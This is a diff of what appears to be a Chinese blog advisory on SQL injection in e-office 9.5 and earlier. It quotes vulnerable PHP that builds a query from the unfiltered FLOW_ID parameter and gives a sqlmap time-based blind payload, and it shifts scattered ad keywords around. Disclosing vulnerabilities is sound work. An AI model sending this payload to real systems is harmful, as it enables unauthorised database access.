@@ -22,14 +22,6 @@ e-office <=9.5
 
 general/workflow/runimgflow.php 业务逻辑如下
 
-深入探索
-
-安全监控系统
-
-安全漏洞扫描工具
-
-文件大小转换
-
 ```
 <?php
 
@@ -39,6 +31,14 @@ include_once( "inc/img_patten.inc.php" );
 $sql = "  \r\n     SELECT ID,FLOW_ID,PRCS_ID,PRCS_NAME,PRCS_USER,PRCS_ITEM,PRCS_DEPT,PRCS_PRIV,PRCS_TO \r\n\t       FROM flow_process \r\n\t\t       WHERE FLOW_ID=".$_REQUEST['FLOW_ID']." \r\n\t\t\t      ORDER BY PRCS_ID ASC\r\n\t\t\t\t  ";
 $res = exequery( $connection, $sql );
 ```
+
+深入探索
+
+网络设备
+
+客户关系管理
+
+搜索
 
 `FLOW_ID` 被直接拼接进SQL语句后执行，无任何过滤校验，造成[SQL注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)漏洞。
 
@@ -71,13 +71,5 @@ Parameter: #1* ((custom) POST)
     Payload: FLOW_ID=1 AND 7348=BENCHMARK(5000000,MD5(0x51747266))
 ---
 ```
-
-深入探索
-
-Web安全课程
-
-移动安全防护软件
-
-服务器安全加固服务
 
 imgflow.php、flowimg.php 存在同样的SQL注入漏洞
